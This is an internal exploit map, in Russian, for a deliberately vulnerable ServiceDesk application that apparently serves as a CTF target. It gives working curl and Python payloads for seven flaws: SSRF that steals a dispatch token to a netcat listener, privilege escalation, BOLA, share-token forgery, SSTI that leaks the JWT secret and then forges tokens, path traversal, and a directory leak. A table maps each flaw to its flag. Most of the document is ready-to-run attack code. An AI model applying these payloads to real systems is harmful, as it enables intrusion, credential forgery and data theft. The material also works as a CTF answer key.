# ServiceDesk — актуальная карта уязвимостей

Этот файл отражает текущее состояние кода в репозитории и проверен на живом
`docker compose`-стеке из этой же директории. Это внутренний документ.

## Общая подготовка

```bash
BASE=http://localhost:8080
USER=demo_red
MAIL=demo_red@example.com
PASS=pass12345

JWT=$(
  curl -s -X POST "$BASE/api/auth/register" \
    -H 'Content-Type: application/json' \
    -d "{\"username\":\"$USER\",\"email\":\"$MAIL\",\"password\":\"$PASS\"}" \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)["access_token"])'
)
AUTH="Authorization: Bearer $JWT"
```

Если пользователь уже существует:

```bash
JWT=$(
  curl -s -X POST "$BASE/api/auth/login" \
    -d "username=$USER&password=$PASS" \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)["access_token"])'
)
AUTH="Authorization: Bearer $JWT"
```

## 1. SSRF через legacy `webhook_url`

### Где

- `POST /api/integrations`
- `PATCH /api/integrations/{id}`
- `POST /api/integrations/{id}/trigger`
- `routers/integrations.py::_absorb_legacy_webhook`, `_decompose_webhook_url`,
  `_resolve_target_for_storage`
- `utils/security.py::validate_webhook_base`
- `utils/delivery_providers.py::resolve_integration_target`
- `utils/ticket_events.py::_deliver_prepared_payload`

### Почему работает

- Публичные поля `base_url` и `endpoint_path` сейчас не входят в модели
  `IntegrationCreate` / `IntegrationUpdate`, поэтому обычный JSON с этими полями
  молча игнорируется.
- До валидации тела роутер отдельно вытаскивает legacy-поле `webhook_url` и
  раскладывает его на `base_url` + `endpoint_path`.
- `validate_webhook_base()` проверяет только схему, наличие host и отсутствие
  credentials. Allowlist хостов в текущем коде нет.
- В итоге пользователь может сохранить произвольный webhook target и затем
  получить исходящий POST от приложения.
- В заголовки исходящего webhook всегда добавляется
  `X-ServiceDesk-Dispatch-Token`, который потом можно использовать против
  `dispatchboard`.

### Важное отличие от старой версии документа

- Сценарий со split-полями `base_url` + `endpoint_path` в текущем сервисе не
  является публичным вектором.
- Реальный эксплуатационный путь для create и update идет только через
  legacy-совместимость `webhook_url`.
- Попытка передать только `base_url`/`endpoint_path` не меняет target.

### Payload

Подготовить тикет и маркер:

```bash
TICKET_ID=$(
  curl -s -X POST "$BASE/api/tickets" \
    -H "$AUTH" \
    -H 'Content-Type: application/json' \
    -d '{"title":"ssrf case","description":"marker","priority":"medium"}' \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)["id"])'
)

curl -s -X POST "$BASE/api/tickets/$TICKET_ID/messages" \
  -H "$AUTH" \
  -H 'Content-Type: application/json' \
  -d '{"body":"FLAG_IN_MESSAGE"}'

nc -lvkp 9011
```

Leg 1: заставить приложение сходить на атакующий хост и украсть
`X-ServiceDesk-Dispatch-Token`:

```bash
INTEGRATION_ID=$(
  curl -s -X POST "$BASE/api/integrations" \
    -H "$AUTH" \
    -H 'Content-Type: application/json' \
    -d "{\"name\":\"capture\",\"webhook_url\":\"http://host.docker.internal:9011/capture\",\"ticket_id\":\"$TICKET_ID\"}" \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)["id"])'
)

curl -s -X POST "$BASE/api/integrations/$INTEGRATION_ID/trigger" -H "$AUTH"
```

Leg 2: repoint на `dispatchboard` и прочитать receipts:

```bash
DISPATCH_TOKEN=TOKEN_FROM_HEADER

curl -s -X PATCH "$BASE/api/integrations/$INTEGRATION_ID" \
  -H "$AUTH" \
  -H 'Content-Type: application/json' \
  -d "{\"webhook_url\":\"http://dispatchboard:8081/dispatch/$DISPATCH_TOKEN/receipts\"}"

curl -s -X POST "$BASE/api/integrations/$INTEGRATION_ID/trigger" -H "$AUTH"
```

В поле `body` вернется JSON с receipts. Для флага нужен receipt с
`event_type = ticket.message.created`.

### Нюансы

- Dispatch token ротируется раз в минуту в `utils/notifications.py::get_dispatch_token`.
- `host.docker.internal` работает в штатном `docker-compose.yml`, потому что
  прописан через `extra_hosts`.

## 2. Hidden support escalation через composite seniority

### Где

- `PATCH /api/users/me`
- `utils/roles.py::effective_seniority`, `is_support_capable`
- `routers/users.py::ProfileUpdate`

### Почему работает

- Support access считается не по отдельному флагу и не по `access_level`, а по
  сумме `role_base + workspace_adjust + scope_adjust`.
- Для обычного customer достаточно поменять профиль на
  `workspace=operations` и `queue_scope=all`, чтобы получить seniority `4`.
- Порог `SUPPORT_ACCESS_THRESHOLD` тоже равен `4`.
- Роут `PATCH /api/users/me` разрешает менять `workspace` и `queue_scope` и
  проверяет их только against allowlist.

### Payload

```bash
curl -s -X PATCH "$BASE/api/users/me" \
  -H "$AUTH" \
  -H 'Content-Type: application/json' \
  -d '{"workspace":"operations","queue_scope":"all","access_level":5}'

curl -s -H "$AUTH" "$BASE/api/tickets"
```

После патча пользователь начинает проходить `has_support_access()` и видит все
тикеты.

## 3. BOLA на lookup артефактов по `public_ref`

### Где

- `GET /api/tickets/{ticket_id}/artifacts/{artifact_id}`
- `GET /api/tickets/{ticket_id}/artifacts/{artifact_id}/download`
- `routers/tickets.py::_resolve_artifact_by_reference`

### Почему работает

- Проверка доступа идет только по `ticket_id` из path.
- Дальше артефакт резолвится отдельно через `_resolve_artifact_by_reference()`,
  который принимает либо UUID, либо числовой `public_ref`.
- После резолва код не проверяет, что найденный `artifact.ticket_id` совпадает с
  `ticket_id` из URL.
- Поэтому свой тикет можно использовать как cover-path, а чужой артефакт
  читать по известному или перебранному `public_ref`.

### Payload

```bash
OWN_TICKET_ID=$(
  curl -s -X POST "$BASE/api/tickets" \
    -H "$AUTH" \
    -H 'Content-Type: application/json' \
    -d '{"title":"cover","description":"own","priority":"medium"}' \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)["id"])'
)

PUBLIC_REF=<known_or_bruteforced>

curl -s -H "$AUTH" \
  "$BASE/api/tickets/$OWN_TICKET_ID/artifacts/$PUBLIC_REF/download"
```

Дополнительная поверхность: metadata-роут
`/api/tickets/{ticket_id}/artifacts/{artifact_id}` уязвим по той же причине.

## 4. Predictable share token

### Где

- `GET /api/share/{token}`
- `utils/share_tokens.py::ShareLinkSigner`, `build_share_token`

### Почему работает

- Токен не случайный и не хранит скрытый серверный secret.
- Ключ HMAC детерминированно строится из публичных значений
  `share_link_brand` и `share_link_revision`.
- Материал подписи тоже полностью предсказуем:
  `brand`, `case_number`, `audience`, `revision`.
- Длина токена фиксированная, берется префикс `base64url(HMAC)` длиной 20
  символов.

### Payload

```bash
CASE_NUMBER=SD-000123
TOKEN=$(
  python3 - "$CASE_NUMBER" <<'PY'
import base64, hashlib, hmac, sys
brand = "servicedesk.local"
revision = "v2"
audience = "external-review"
case = sys.argv[1]
key = hashlib.sha256(f"{brand}|{revision}".encode()).digest()[:32]
material = "\x1f".join([brand, case, audience, revision]).encode()
mac = hmac.new(key, material, hashlib.sha256).digest()
print(base64.urlsafe_b64encode(mac).decode().rstrip("=")[:20])
PY
)

curl -s "$BASE/api/share/$TOKEN"
```

Share view раскрывает `description`, `vendor_case_id`, `report_template`,
`resolution`, `messages`, `artifacts`.

## 5. SSTI через `runtime.defaults` -> JWT secret -> forged service token

### Где

- `POST /api/reports`
- `utils/template_engine.py::ReportRuntime`, `build_report_context`
- `utils/auth.py::_resolve_principal`

### Почему работает

- Рендерер действительно использует `jinja2.sandbox.SandboxedEnvironment`.
- Но в шаблонный контекст добавляется `runtime = ReportRuntime(settings)`.
- Property `runtime.defaults` возвращает объект `Settings` целиком.
- Через `runtime.defaults.jwt_secret` утаскивается секрет подписи JWT.
- В `get_current_user()` значение `kind` из токена влияет на способ lookup:
  `kind="service"` переключает резолвинг с `id` на `username`.
- Подписав токен с `{"sub":"support","kind":"service"}`, можно выдать себя за
  support-аккаунт.

### Payload

1. Слить `jwt_secret` на своем тикете:

```bash
OWN_TICKET_ID=<your_ticket_id>

curl -s -X POST "$BASE/api/reports" \
  -H "$AUTH" \
  -H 'Content-Type: application/json' \
  -d "{\"ticket_id\":\"$OWN_TICKET_ID\",\"custom_template\":\"{{ runtime.defaults.jwt_secret }}\"}"
```

2. Подписать forged JWT:

```bash
SECRET=LEAKED_SECRET

python3 - "$SECRET" <<'PY'
import base64, hashlib, hmac, json, sys, time
secret = sys.argv[1].encode()
header = {"alg":"HS256","typ":"JWT"}
payload = {"sub":"support","kind":"service","exp":int(time.time())+3600}
def b64(x):
    return base64.urlsafe_b64encode(
        json.dumps(x, separators=(",", ":")).encode()
    ).rstrip(b"=").decode()
h = b64(header)
b = b64(payload)
sig = hmac.new(secret, f"{h}.{b}".encode(), hashlib.sha256).digest()
print(f"{h}.{b}.{base64.urlsafe_b64encode(sig).rstrip(b'=').decode()}")
PY
```

3. С support-токеном читать чужой `automation_secret`:

```bash
FORGED=<forged_token>
VICTIM_TICKET_ID=<target_ticket_id>

curl -s -X POST "$BASE/api/reports" \
  -H "Authorization: Bearer $FORGED" \
  -H 'Content-Type: application/json' \
  -d "{\"ticket_id\":\"$VICTIM_TICKET_ID\",\"custom_template\":\"{{ ticket.automation_secret }}\"}"
```

## 6. Path traversal через однопроходную strip-санитизацию

### Где

- `GET /api/files/exports/download?name=...`
- `utils/filenames.py::normalise_export_name`, `_strip_leading_dot_segments`

### Почему работает

- `_strip_leading_dot_segments()` снимает только один префикс `./` и только один
  префикс `../`.
- Цикла нет, повторной нормализации нет.
- Payload `../../cases/<case>/snapshot.txt` после обработки остается
  `../cases/<case>/snapshot.txt`.
- Затем `os.path.join(_exports_dir(), safe_name)` дает путь за пределами
  директории exports.

### Payload

```bash
CASE_NUMBER=SD-000123

curl -sG "$BASE/api/files/exports/download" \
  -H "$AUTH" \
  --data-urlencode "name=../../cases/$CASE_NUMBER/snapshot.txt"
```

В `snapshot.txt` лежат `Description`, `Device Serial`, сообщения и список
артефактов по кейсу.

## 7. Directory leak через `GET /api/users`

### Где

- `GET /api/users`
- `routers/users.py::list_users`

### Почему работает

- Роут доступен любому аутентифицированному пользователю.
- `contact_phone` теперь отдается без feature-flag и без дополнительной проверки
  роли.
- В ответ directory включается полный телефон каждого пользователя.

### Payload

```bash
curl -s -H "$AUTH" "$BASE/api/users" | python3 -m json.tool
```

## Карта флагов

| vuln | где лежит флаг |
|---|---|
| 1 | `ticket_message.body` |
| 2 | `ticket.description` |
| 3 | содержимое файла артефакта |
| 4 | `ticket.vendor_case_id` |
| 5 | `ticket.automation_secret` |
| 6 | `ticket.device_serial` в `snapshot.txt` |
| 7 | `user.contact_phone` |

## Операционные замечания

- `JWT_SECRET` берется из env / `servicedesk/app/.env`, а если не задан -
  генерируется на старте процесса. При его смене forged токены из vuln 5
  инвалидируются.
- Share token зависит от `SHARE_LINK_BRAND` и `SHARE_LINK_REVISION`; если
  команда меняет env, эксплойт для vuln 4 нужно пересчитать.
- Support-аккаунт создается на старте приложения. По умолчанию это username
  `support`; пароль можно задать через env / `servicedesk/app/.env`, а если при
  первом seed он не задан - сервис генерирует его и пишет в логи.
- `dispatchboard` доступен приложению по внутренней сети compose и возвращает
  receipts только при корректном `X-ServiceDesk-Dispatch-Token`.
